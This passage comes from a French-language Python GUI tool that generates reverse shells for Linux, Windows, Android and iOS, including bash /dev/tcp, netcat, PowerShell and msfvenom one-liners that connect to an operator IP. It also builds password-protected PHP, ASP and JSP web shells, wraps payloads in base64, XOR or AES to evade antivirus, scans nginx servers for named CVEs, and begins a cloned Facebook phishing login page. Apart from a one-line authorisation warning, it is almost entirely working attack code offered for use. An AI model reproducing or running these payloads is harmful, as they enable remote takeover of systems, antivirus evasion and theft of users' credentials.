        ttk.Label(warn, text=(
            "Usage strictement r\u00e9serv\u00e9 aux tests d'intrusion autoris\u00e9s et environnements contr\u00f4l\u00e9s. "
            "L'utilisation non autoris\u00e9e est ill\u00e9gale."
        ), foreground="red", wraplength=780).pack(padx=10, pady=6)

        nb = ttk.Notebook(main)
        nb.pack(fill=tk.BOTH, expand=True)

        # ── Tab 1: Reverse Shells ──
        rev_frame = ttk.Frame(nb)
        nb.add(rev_frame, text="Shells Inverses")

        f1 = ttk.LabelFrame(rev_frame, text="G\u00e9n\u00e9rateur de Payloads Multi-Plateforme")
        f1.pack(fill=tk.X, padx=8, pady=8)

        ttk.Label(f1, text="IP:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
        self.entry_rs_ip = ttk.Entry(f1, width=18, font=("TkDefaultFont", 11))
        self.entry_rs_ip.grid(row=0, column=1, padx=5, pady=4, sticky="w")
        self.entry_rs_ip.insert(0, "192.168.1.100")

        ttk.Label(f1, text="Port:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
        self.entry_rs_port = ttk.Entry(f1, width=8, font=("TkDefaultFont", 11))
        self.entry_rs_port.grid(row=0, column=3, padx=5, pady=4, sticky="w")
        self.entry_rs_port.insert(0, "4444")

        ttk.Label(f1, text="Plateforme:").grid(row=1, column=0, padx=5, pady=4, sticky="w")
        self.rs_platform = tk.StringVar(value="linux")
        pf = ttk.Frame(f1)
        pf.grid(row=1, column=1, columnspan=3, padx=5, pady=4, sticky="w")
        ttk.Radiobutton(pf, text="Linux", variable=self.rs_platform, value="linux").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(pf, text="Windows", variable=self.rs_platform, value="windows").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(pf, text="Android", variable=self.rs_platform, value="android").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(pf, text="iOS", variable=self.rs_platform, value="ios").pack(side=tk.LEFT, padx=2)
        ttk.Radiobutton(pf, text="Cross", variable=self.rs_platform, value="cross").pack(side=tk.LEFT, padx=2)

        ttk.Label(f1, text="Type:").grid(row=2, column=0, padx=5, pady=4, sticky="w")
        self.rs_type = tk.StringVar(value="python")
        self._type_frame = ttk.Frame(f1)
        self._type_frame.grid(row=2, column=1, columnspan=3, padx=5, pady=4, sticky="w")
        self._populate_type_buttons(self._type_frame)
        self.rs_platform.trace_add("write", self._on_platform_change)

        ttk.Button(f1, text="G\u00e9n\u00e9rer Payload", command=self.run_gen_payload, width=22).grid(row=3, column=0, columnspan=8, pady=6)

        # ── Tab 2: Web Shells ──
        web_frame = ttk.Frame(nb)
        nb.add(web_frame, text="Web Shells")

        f2 = ttk.LabelFrame(web_frame, text="G\u00e9n\u00e9rateur de Web Shell")
        f2.pack(fill=tk.X, padx=8, pady=8)

        self.ws_type = tk.StringVar(value="php")
        ttk.Label(f2, text="Type:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
        ttk.Radiobutton(f2, text="PHP", variable=self.ws_type, value="php").grid(row=0, column=1, padx=2)
        ttk.Radiobutton(f2, text="ASP", variable=self.ws_type, value="asp").grid(row=0, column=2, padx=2)
        ttk.Radiobutton(f2, text="JSP", variable=self.ws_type, value="jsp").grid(row=0, column=3, padx=2)

        self.ws_obfuscate = tk.BooleanVar(value=True)
        ttk.Checkbutton(f2, text="Obscurcir (base64)", variable=self.ws_obfuscate).grid(row=0, column=4, padx=10)

        self.entry_ws_pass = ttk.Entry(f2, width=15)
        self.entry_ws_pass.insert(0, "cyberai")
        ttk.Label(f2, text="Mot de passe:").grid(row=0, column=5, padx=5, pady=4, sticky="w")
        self.entry_ws_pass.grid(row=0, column=6, padx=5, pady=4, sticky="w")

        ttk.Button(f2, text="G\u00e9n\u00e9rer Web Shell", command=self.run_gen_webshell, width=22).grid(row=1, column=0, columnspan=7, pady=6)

        # ── Tab 3: AV Evasion ──
        evade_frame = ttk.Frame(nb)
        nb.add(evade_frame, text="Contournement AV")

        f3 = ttk.LabelFrame(evade_frame, text="Encodage / Obfuscation de Payload")
        f3.pack(fill=tk.X, padx=8, pady=8)

        ttk.Label(f3, text="Payload brut:").grid(row=0, column=0, padx=5, pady=4, sticky="nw")
        self.entry_raw = scrolledtext.ScrolledText(f3, height=4, width=80, font=("Consolas", 9))
        self.entry_raw.grid(row=0, column=1, columnspan=4, padx=5, pady=4)

        self.evade_method = tk.StringVar(value="base64")
        ttk.Radiobutton(f3, text="Base64", variable=self.evade_method, value="base64").grid(row=1, column=1, padx=3)
        ttk.Radiobutton(f3, text="XOR (single-byte)", variable=self.evade_method, value="xor").grid(row=1, column=2, padx=3)
        ttk.Radiobutton(f3, text="AES (CBC)", variable=self.evade_method, value="aes").grid(row=1, column=3, padx=3)
        ttk.Radiobutton(f3, text="Split + Join", variable=self.evade_method, value="split").grid(row=1, column=4, padx=3)

        ttk.Button(f3, text="Encoder", command=self.run_encode, width=15).grid(row=2, column=1, pady=6)
        ttk.Button(f3, text="Encoder + Wrap Python", command=self.run_encode_wrap, width=22).grid(row=2, column=2, columnspan=2, pady=6)

        # ── Tab 4: Vuln Scanner ──
        vuln_frame = ttk.Frame(nb)
        nb.add(vuln_frame, text="Scan Vuln\u00e9rabilit\u00e9s")
        f4 = ttk.LabelFrame(vuln_frame, text="Scan de vulnérabilités (Nginx, Apache)")
        f4.pack(fill=tk.X, padx=8, pady=8)

        ttk.Label(f4, text="Cible:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
        self.entry_vuln_target = ttk.Entry(f4, width=38, font=("TkDefaultFont", 11))
        self.entry_vuln_target.grid(row=0, column=1, padx=5, pady=4, sticky="w")
        self.entry_vuln_target.insert(0, "example.com")

        ttk.Label(f4, text="Ports:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
        self.entry_vuln_ports = ttk.Entry(f4, width=18)
        self.entry_vuln_ports.grid(row=0, column=3, padx=5, pady=4, sticky="w")
        self.entry_vuln_ports.insert(0, "80,443,8080,8443")

        ttk.Button(f4, text="🔍 Scan Nginx", command=self.run_nginx_scan, width=20).grid(row=1, column=0, columnspan=4, pady=6)

        # ── Output ──
        self.output = self.make_output(main)

    # ── Payload Types per Platform ──
    def _populate_type_buttons(self, parent=None):
        pf = self.rs_platform.get()
        types = {
            "linux":    ["python", "bash", "nc", "perl", "ruby"],
            "windows":  ["powershell", "python", "nc", "msfvenom", "csharp"],
            "android":  ["python", "bash", "java", "msfvenom", "termux"],
            "ios":      ["python", "bash", "js", "msfvenom"],
            "cross":    ["python", "bash", "nc", "perl", "ruby", "lua", "php"],
        }
        opts = types.get(pf, types["linux"])
        f = parent if parent else self._type_frame
        for c in f.winfo_children():
            c.destroy()
        self.rs_type = tk.StringVar(value=opts[0])
        for t in opts:
            tk.Radiobutton(f, text=t.capitalize(), variable=self.rs_type, value=t).pack(side=tk.LEFT, padx=2)

    def _on_platform_change(self, *args):
        if hasattr(self, "_type_frame"):
            self._populate_type_buttons(self._type_frame)

    # ── Payload Generator ──
    def run_gen_payload(self):
        self.clear(self.output)
        ip = self.entry_rs_ip.get().strip()
        port = self.entry_rs_port.get().strip()
        if not ip or not port:
            messagebox.showwarning("Attention", "Entrez IP et Port.")
            return
        self.run_thread(lambda: self.do_gen_payload(ip, port))

    def do_gen_payload(self, ip, port):
        platform = self.rs_platform.get()
        ptype = self.rs_type.get()
        self.log(self.output, f"Payload [{platform}] {ptype.upper()} — {ip}:{port}", "bold")
        self.log(self.output, f"Commande d'\u00e9coute: nc -lvnp {port}\n")
        self.log(self.output, "-" * 60)

        if ptype == "python":
            payload = (
                f"# Python reverse shell — {platform}\n"
                f'python3 -c "\n'
                f'import socket,subprocess,os\n'
                f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
                f's.connect((\"{ip}\",{port}))\n'
                f'os.dup2(s.fileno(),0)\n'
                f'os.dup2(s.fileno(),1)\n'
                f'os.dup2(s.fileno(),2)\n'
                f'import pty\n'
                f'pty.spawn(\"/bin/sh\")\n'
                f'"'
            )
            if platform == "windows":
                payload = (
                    f"# Python reverse shell — Windows\n"
                    f'python -c "\n'
                    f'import socket,subprocess\n'
                    f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
                    f's.connect((\"{ip}\",{port}))\n'
                    f'subprocess.call([\"cmd.exe\"],stdin=s.fileno(),\n'
                    f'  stdout=s.fileno(),stderr=s.fileno())\n'
                    f'"'
                )

        elif ptype == "bash":
            payload = (
                f"# Bash reverse shell — {platform}\n"
                f"bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n"
                f"# Alternative:\n"
                f"exec 5<>/dev/tcp/{ip}/{port};cat <&5|while read l;do $l 2>&5 >&5;done"
            )

        elif ptype == "powershell":
            b64 = self._ps_b64(ip, port)
            payload = (
                f"# PowerShell reverse shell — Windows\n"
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}\n\n"
                f"# Alternative (one-liner):\n"
                f'powershell -c "$c=New-Object Net.Sockets.TCPClient(\'{ip}\',{port});'
                f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
                f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
                f'$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';'
                f'$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"'
            )

        elif ptype == "nc":
            if platform in ("windows",):
                payload = (
                    f"# Netcat reverse shell — Windows\n"
                    f"nc -e cmd.exe {ip} {port}\n"
                    f"# Si nc.noconsole:\n"
                    f"nc {ip} {port} -e cmd.exe"
                )
            else:
                payload = (
                    f"# Netcat reverse shell — Linux/Unix\n"
                    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f\n\n"
                    f"# OpenBSD:\n"
                    f"nc -e /bin/sh {ip} {port}"
                )

        elif ptype == "perl":
            payload = (
                f"# Perl reverse shell — Cross-platform\n"
                f'perl -e \'use Socket;$i="{ip}";$p={port};'
                f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
                f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
                f'exec("/bin/sh -i");}};\'\n\n'
                f"# Windows (Strawberry Perl):\n"
                f'perl -MIO -e \'$c=IO::Socket::INET->new(PeerAddr=>"{ip}",PeerPort=>{port});'
                f'STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
            )

        elif ptype == "ruby":
            payload = (
                f"# Ruby reverse shell — Cross-platform\n"
                f'ruby -rsocket -e \'c=TCPSocket.new("{ip}",{port});'
                f'$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);'
                f'$stdin.each_line{{|l|l=l.strip;next if l.length<1;'
                f'(IO.popen(l,"r"){{|io|c.print io.read}})rescue c.print "error: #{{$!}}\\n"}}\'\n\n'
                f"# Alternative:\n"
                f'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}",{port});'
                f'loop{{c.gets.chomp!;break if $_=="exit";'
                f'IO.popen($_,?r){{|io|c.print io.read}}rescue c.print "error\\n"}}\''
            )

        elif ptype == "lua":
            payload = (
                f"# Lua reverse shell — Cross-platform\n"
                f'lua -e \'local s=require("socket");'
                f'local t=s.tcp();t:connect("{ip}",{port});'
                f'while true do local r,x=t:receive();local f=io.popen(r,"r");'
                f'local s=table.concat({{f:read("*a")}});t:send(s);end;'
                f't:close();\'\n'
            )

        elif ptype == "php":
            payload = (
                f"# PHP reverse shell — Cross-platform\n"
                f'php -r \'$s=fsockopen("{ip}",{port});'
                f'exec("/bin/sh -i <&3 >&3 2>&3");\'\n\n'
                f"# Windows:\n"
                f'php -r \'$s=fsockopen("{ip}",{port});'
                f'exec("cmd.exe <&3 >&3 2>&3");\'\n'
            )

        elif ptype == "java":
            if platform == "android":
                payload = (
                    f"// Java reverse shell — Android\n"
                    f'// Compile: javac Rev.java && dx --dex --output=rev.dex Rev.class\n'
                    f'// Push: adb push rev.dex /data/local/tmp/\n'
                    f'// Run: dalvikvm -cp /data/local/tmp/rev.dex Rev\n'
                    f'import java.io.*;\n'
                    f'import java.net.*;\n'
                    f'public class Rev {{\n'
                    f'  public static void main(String[] a) throws Exception {{\n'
                    f'    Socket s=new Socket("{ip}",{port});\n'
                    f'    BufferedReader r=new BufferedReader(new InputStreamReader(s.getInputStream()));\n'
                    f'    PrintWriter w=new PrintWriter(s.getOutputStream(),true);\n'
                    f'    while(true){{w.println(new java.util.Scanner(Runtime.getRuntime()'
                    f'.exec(r.readLine()).getInputStream()).useDelimiter("\\\\A").next());}}\n'
                    f'  }}\n'
                    f'}}'
                )
            else:
                payload = (
                    f"// Java reverse shell — Cross-platform\n"
                    f'// Compile: javac Rev.java && java Rev\n'
                    f'import java.io.*;\n'
                    f'import java.net.*;\n'
                    f'public class Rev {{\n'
                    f'  public static void main(String[] a) throws Exception {{\n'
                    f'    Runtime r=Runtime.getRuntime();\n'
                    f'    Process p=r.exec(new String[]{{"/bin/sh","-i"}});\n'
                    f'    Socket s=new Socket("{ip}",{port});\n'
                    f'    p.getInputStream().transferTo(s.getOutputStream());\n'
                    f'    s.getInputStream().transferTo(p.getOutputStream());\n'
                    f'  }}\n'
                    f'}}'
                )

        elif ptype == "js":
            payload = (
                f"// JavaScript reverse shell — Node.js / iOS\n"
                f'// Node.js:\n'
                f'require("child_process").exec(\n'
                f'  "bash -c \\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\\"")\n\n'
                f'// iOS (iSH shell):\n'
                f'// M\u00eame que bash ci-dessus dans iSH\n'
                f'// Ou avec Runtime:\n'
                f'const {{exec}}=require("child_process");\n'
                f'const net=require("net");\n'
                f'const c=net.connect({port},"{ip}",()=>{{\n'
                f'  exec("bash",(e,o)=>c.write(o));\n'
                f'}});'
            )

        elif ptype == "msfvenom":
            if platform == "android":
                payload = (
                    f"# MSFVenom — Android APK\n"
                    f"msfvenom -p android/meterpreter/reverse_tcp "
                    f"LHOST={ip} LPORT={port} -o payload.apk\n"
                    f"# Signer:\n"
                    f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 "
                    f"-keystore my.keystore payload.apk alias\n\n"
                    f"# Lancer l'\u00e9coute:\n"
                    f"msfconsole -q -x 'use multi/handler; "
                    f"set payload android/meterpreter/reverse_tcp; "
                    f"set LHOST {ip}; set LPORT {port}; exploit'"
                )
            elif platform == "ios":
                payload = (
                    f"# MSFVenom — iOS (IPA)\n"
                    f"msfvenom -p ios/meterpreter/reverse_tcp "
                    f"LHOST={ip} LPORT={port} -o payload.ipa\n\n"
                    f"# Lancer l'\u00e9coute:\n"
                    f"msfconsole -q -x 'use multi/handler; "
                    f"set payload ios/meterpreter/reverse_tcp; "
                    f"set LHOST {ip}; set LPORT {port}; exploit'"
                )
            elif platform == "windows":
                payload = (
                    f"# MSFVenom — Windows EXE\n"
                    f"msfvenom -p windows/meterpreter/reverse_tcp "
                    f"LHOST={ip} LPORT={port} -f exe -o payload.exe\n\n"
                    f"# Encoded (AV evasion):\n"
                    f"msfvenom -p windows/meterpreter/reverse_tcp "
                    f"LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 "
                    f"-f exe -o payload_encoded.exe\n\n"
                    f"# PowerShell:\n"
                    f"msfvenom -p windows/x64/meterpreter/reverse_tcp "
                    f"LHOST={ip} LPORT={port} -f psh-reflection -o payload.ps1"
                )
            else:
                payload = (
                    f"# MSFVenom — Linux ELF\n"
                    f"msfvenom -p linux/x64/meterpreter/reverse_tcp "
                    f"LHOST={ip} LPORT={port} -f elf -o payload.elf\n\n"
                    f"# Python:\n"
                    f"msfvenom -p python/meterpreter/reverse_tcp "
                    f"LHOST={ip} LPORT={port} -o payload.py\n\n"
                    f"# Lancer l'\u00e9coute:\n"
                    f"msfconsole -q -x 'use multi/handler; "
                    f"set payload linux/x64/meterpreter/reverse_tcp; "
                    f"set LHOST {ip}; set LPORT {port}; exploit'"
                )

        elif ptype == "csharp":
            payload = (
                f"// C# reverse shell — Windows\n"
                f'// Compile: csc shell.cs\n'
                f'using System;\n'
                f'using System.Net.Sockets;\n'
                f'using System.Diagnostics;\n'
                f'class Shell {{\n'
                f'  static void Main() {{\n'
                f'    var c=new TcpClient("{ip}",{port});\n'
                f'    var s=c.GetStream();\n'
                f'    var p=new Process();\n'
                f'    p.StartInfo.FileName="cmd.exe";\n'
                f'    p.StartInfo.UseShellExecute=false;\n'
                f'    p.StartInfo.RedirectStandardInput=true;\n'
                f'    p.StartInfo.RedirectStandardOutput=true;\n'
                f'    p.StartInfo.RedirectStandardError=true;\n'
                f'    p.Start();\n'
                f'    p.StandardInput.BaseStream.CopyTo(s);\n'
                f'    s.CopyTo(p.StandardInput.BaseStream);\n'
                f'    p.WaitForExit();\n'
                f'  }}\n'
                f'}}'
            )

        elif ptype == "termux":
            payload = (
                f"# Termux reverse shell — Android\n"
                f"# Installer: pkg install python -y\n"
                f"# Puis lancer le payload Python ci-dessous:\n\n"
                f'python3 -c "\n'
                f'import socket,subprocess,os\n'
                f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
                f's.connect((\"{ip}\",{port}))\n'
                f'os.dup2(s.fileno(),0)\n'
                f'os.dup2(s.fileno(),1)\n'
                f'os.dup2(s.fileno(),2)\n'
                f'os.system(\"/data/data/com.termux/files/usr/bin/bash\")\n'
                f'"\n\n'
                f"# Alternative avec NC:\n"
                f"pkg install netcat-openbsd -y\n"
                f"rm /data/data/com.termux/files/usr/tmp/f;"
                f"mkfifo /data/data/com.termux/files/usr/tmp/f;"
                f"cat /data/data/com.termux/files/usr/tmp/f|/data/data/com.termux/files/usr/bin/bash -i 2>&1|"
                f"nc {ip} {port} >/data/data/com.termux/files/usr/tmp/f"
            )

        else:
            payload = f"# Payload non trouv\u00e9 pour {platform}/{ptype}"

        self.log(self.output, payload, "success")
        self.log(self.output, "\n\u2139\ufe0f Collez/ex\u00e9cutez sur la cible, puis \u00e9coutez avec nc.", "bold")

    def _ps_b64(self, ip, port):
        import base64
        code = (
            f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$sb=(iex $d 2>&1|Out-String);"
            f"$sb2=$sb+'PS '+(pwd).Path+'> ';"
            f"$sb=([text.encoding]::ASCII).GetBytes($sb2);"
            f"$s.Write($sb,0,$sb.Length);$s.Flush()}}"
            f"$c.Close()"
        )
        return base64.b64encode(code.encode("utf-16le")).decode()

    # ── Web Shell Generator ──
    def run_gen_webshell(self):
        self.clear(self.output)
        self.run_thread(lambda: self.do_gen_webshell())

    def do_gen_webshell(self):
        ws_type = self.ws_type.get()
        pwd = self.entry_ws_pass.get().strip() or "cyberai"
        obfuscate = self.ws_obfuscate.get()

        if ws_type == "php":
            if obfuscate:
                shell = (
                    f'<?php\n'
                    f'$p="{pwd}";\n'
                    f'if(isset($_REQUEST["$p"])){{\n'
                    f'  $c=base64_decode($_REQUEST["c"]);\n'
                    f'  system($c);\n'
                    f'}}\n'
                    f'?>\n'
                    f'<!-- Usage: ?{pwd}&c=base64(command) -->'
                )
            else:
                shell = (
                    f'<?php\n'
                    f'$p="{pwd}";\n'
                    f'if(isset($_REQUEST["$p"])){{\n'
                    f'  system($_REQUEST["c"]);\n'
                    f'}}\n'
                    f'?>\n'
                    f'<!-- Usage: ?{pwd}&c=command -->'
                )
        elif ws_type == "asp":
            shell = (
                f'<%\n'
                f'Dim p:{p}=Request("{pwd}")\n'
                f'If p <> "" Then\n'
                f'  Execute(p)\n'
                f'End If\n'
                f'%>\n'
                f'<!-- Usage: ?{pwd}=Response.Write(server.createobject("WScript.Shell").exec("cmd /c whoami").stdout.readall) -->'
            )
        elif ws_type == "jsp":
            shell = (
                f'<%@ page import="java.io.*" %>\n'
                f'<%\n'
                f'  String c = request.getParameter("{pwd}");\n'
                f'  if(c != null) {{\n'
                f'    Process p = Runtime.getRuntime().exec(c);\n'
                f'    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
                f'    String l;while((l=br.readLine())!=null) out.println(l);\n'
                f'  }}\n'
                f'%>\n'
                f'<!-- Usage: ?{pwd}=whoami -->'
            )
        else:
            shell = "Type non support\u00e9."

        self.log(self.output, f"Web Shell ({ws_type.upper()}) — password: {pwd}", "bold")
        self.log(self.output, shell, "success")

    # ── AV Evasion ──
    def run_encode(self):
        self.clear(self.output)
        self.run_thread(lambda: self.do_encode())

    def do_encode(self):
        raw = self.entry_raw.get("1.0", tk.END).strip()
        if not raw:
            messagebox.showwarning("Attention", "Entrez un payload brut.")
            return
        method = self.evade_method.get()
        result = self.encode_payload(raw, method)
        self.log(self.output, f"Payload original ({len(raw)} octets):", "bold")
        self.log(self.output, raw)
        self.log(self.output, f"\nPayload encod\u00e9 ({method}):", "bold")
        self.log(self.output, result, "success")

    def run_encode_wrap(self):
        self.clear(self.output)
        self.run_thread(lambda: self.do_encode_wrap())

    def do_encode_wrap(self):
        raw = self.entry_raw.get("1.0", tk.END).strip()
        if not raw:
            messagebox.showwarning("Attention", "Entrez un payload brut.")
            return
        method = self.evade_method.get()
        encoded = self.encode_payload(raw, method)

        if method == "base64":
            wrapper = (
                f'import base64,os\n'
                f'exec(base64.b64decode("{encoded}").decode())\n'
            )
        elif method == "xor":
            key_match = encoded.split(":")[0]
            data = encoded.split(":")[1]
            wrapper = (
                f'import os\n'
                f'key={key_match}\n'
                f'enc={data}\n'
                f'dec=bytes(k^key for k in enc)\n'
                f'exec(dec.decode())\n'
            )
        elif method == "aes":
            wrapper = (
                f'from Crypto.Cipher import AES\n'
                f'import base64,os\n'
                f'key=base64.b64decode("{encoded[:44]}")\n'
                f'iv=base64.b64decode("{encoded[44:68]}")\n'
                f'c=AES.new(key,AES.MODE_CBC,iv)\n'
                f'exec(c.decrypt(base64.b64decode("{encoded[68:]}")).decode())\n'
            )
        elif method == "split":
            parts = encoded.split(":")
            wrapper = (
                f'import os\n'
                f'p={parts}\n'
                f'exec("".join(p))\n'
            )
        else:
            wrapper = encoded

        self.log(self.output, f"Payload encod\u00e9 + wrapper Python ({method}):", "bold")
        self.log(self.output, wrapper, "success")

    def encode_payload(self, raw, method):
        if method == "base64":
            import base64
            return base64.b64encode(raw.encode()).decode()
        elif method == "xor":
            key = random.randint(1, 255)
            data = bytes(k ^ key for k in raw.encode())
            return f"{key}:{list(data)}"
        elif method == "aes":
            try:
                from Crypto.Cipher import AES
                import base64
                key = os.urandom(32)
                iv = os.urandom(16)
                raw_padded = raw.encode()
                while len(raw_padded) % 16 != 0:
                    raw_padded += b"\x00"
                c = AES.new(key, AES.MODE_CBC, iv)
                ct = c.encrypt(raw_padded)
                return base64.b64encode(key).decode() + base64.b64encode(iv).decode() + base64.b64encode(ct).decode()
            except ImportError:
                return "pycryptodome non install\u00e9. Utilisez base64 ou XOR."
        elif method == "split":
            parts = [raw[i:i+20] for i in range(0, len(raw), 20)]
            return ":".join(parts)
        return raw

    # ── Nginx Vulnerability Scanner ──
    def run_nginx_scan(self):
        self.clear(self.output)
        target = self.entry_vuln_target.get().strip()
        if not target:
            messagebox.showwarning("Attention", "Entrez une IP ou URL cible.")
            return
        self.run_thread(lambda: self.do_nginx_scan(target))

    def do_nginx_scan(self, target):
        self.log(self.output, f"{'═'*55}", "bold")
        self.log(self.output, f"  Scan Nginx — Cible: {target}", "bold")
        self.log(self.output, f"{'═'*55}", "bold")

        host = target.split("://")[-1].split("/")[0].split(":")[0]
        ports = [int(p) for p in self.entry_vuln_ports.get().split(",") if p.strip()]
        found_nginx = False

        for port in ports:
            self.log(self.output, f"\n── Port {port} ──", "bold")
            result = self._check_port(host, port)
            if result:
                found_nginx = True

        if not found_nginx:
            self.log(self.output, "\n  Aucun serveur nginx détecté sur les ports scannés.", "warning")

        self.log(self.output, f"\n{'─'*55}", "bold")
        self.log(self.output, "[✓] Scan terminé.", "success")

    def _check_port(self, host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if sock.connect_ex((host, port)) != 0:
                self.log(self.output, "  Fermé", "warning")
                sock.close()
                return False
            self.log(self.output, "  Ouvert", "success")

            banner = b""
            try:
                if port in (443, 8443):
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    ctx.set_alpn_protocols(["h2", "http/1.1"])
                    ssock = ctx.wrap_socket(sock, server_hostname=host)
                    ssock.settimeout(5)
                    ssock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                    banner = ssock.recv(4096)
                    alpn = ssock.selected_alpn_protocol()
                    if alpn:
                        self.log(self.output, f"    ALPN: {alpn}", "bold")
                    ssock.close()
                else:
                    sock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                    banner = sock.recv(4096)
                    sock.close()
            except Exception as e:
                sock.close()
                self.log(self.output, f"    Erreur de réception: {e}", "warning")
                return False

            resp = banner.decode("utf-8", errors="ignore")
            server = ""
            for line in resp.split("\r\n"):
                if line.lower().startswith("server:"):
                    server = line.split(":", 1)[1].strip()
                    break

            if not server:
                self.log(self.output, "    Serveur: Inconnu (headers masqués?)", "bold")
                return False

            self.log(self.output, f"    Serveur: {server}", "bold")

            if "nginx" in server.lower():
                self._check_nginx_vulns(host, port, server, resp)
                return True
            else:
                self.log(self.output, "    → Pas du nginx (aucune vuln nginx testée)", "warning")
                return False

        except Exception as e:
            self.log(self.output, f"    Erreur: {e}", "error")
            return False

    def _check_nginx_vulns(self, host, port, server, resp):
        vm = re.search(r"nginx[/\s]*([\d.]+)", server)
        version = vm.group(1) if vm else None

        if version:
            self.log(self.output, f"    Version: {version}", "bold")
            self._cve_check(version)
        else:
            self.log(self.output, "    Version: cachée", "warning")

        self.log(self.output, "  ── CVE-2026-42945 (NGINX Rift) ──", "bold")
        self._test_42945(host, port, version)

        self.log(self.output, "  ── CVE-2026-49975 (HTTP/2 Bomb) ──", "bold")
        self._test_49975(host, port)

    def _cve_check(self, version):
        try:
            v = [int(x) for x in version.split(".")]
        except ValueError:
            self.log(self.output, "    Version non parseable", "warning")
            return

        reports = []
        # CVE-2026-42945: 0.6.27 ≤ version ≤ 1.30.0
        if (v[0] == 0 and v[1] >= 6 and len(v) > 2 and v[2] >= 27) or \
           (v[0] == 1 and (v[1] < 30 or (v[1] == 30 and len(v) > 2 and v[2] == 0))):
            reports.append(("CVE-2026-42945", "9.2", "Heap overflow rewrite → RCE/DoS"))

        if reports:
            for cve, cvss, desc in reports:
                self.log(self.output, f"    ⚠ {cve} (CVSS {cvss}) — {desc}", "error")
        else:
            self.log(self.output, "    ✓ Aucune CVE majeure connue", "success")

    def _test_42945(self, host, port, version):
        try:
            scheme = "https" if port in (443, 8443) else "http"
            sess = self.app.session if hasattr(self.app, 'session') else requests

            # Test with malformed rewrite pattern
            tests = [
                ("/${}", 400, "rewrite"),
                ("/..%2500../", 400, "null byte"),
            ]
            for path, expected_code, hint in tests:
                url = f"{scheme}://{host}:{port}{path}"
                r = sess.get(url, timeout=5, verify=False)
                if r.status_code == expected_code and hint in r.text.lower():
                    self.log(self.output, f"    ⚠ Potentiellement vulnérable ({hint})", "error")
                elif r.status_code in (400, 404, 405):
                    self.log(self.output, f"    ✓ Réponse {r.status_code} — safe", "success")
                else:
                    self.log(self.output, f"    ? HTTP {r.status_code} — vérifier manuellement", "warning")
        except Exception as e:
            self.log(self.output, f"    ? Test échoué: {e}", "warning")

    def _test_49975(self, host, port):
        if port not in (443, 8443):
            self.log(self.output, "    ○ Non testé (port non SSL)", "bold")
            return
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            ssock = ctx.wrap_socket(sock, server_hostname=host)
            ssock.connect((host, port))
            alpn = ssock.selected_alpn_protocol()
            ssock.close()

            if alpn == "h2":
                self.log(self.output, f"    ⚠ HTTP/2 actif — potentiel CVE-2026-49975 (amplification 70:1)", "error")
            else:
                self.log(self.output, f"    ✓ HTTP/2 non supporté (ALPN: {alpn or 'aucun'})", "success")
        except Exception as e:
            self.log(self.output, f"    ? Échec: {e}", "warning")


# ════════════════════════ 9. PHISHING ════════════════════════
PHISHING_TEMPLATES = {
    "Facebook": {
        "title": "Facebook - Connexion",
        "logo": "📘",
        "fields": ["email", "pass"],
        "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook - Connexion</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px;text-align:center}
.logo{color:#1877f2;font-size:48px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
button{background:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:bold;width:100%;cursor:pointer}
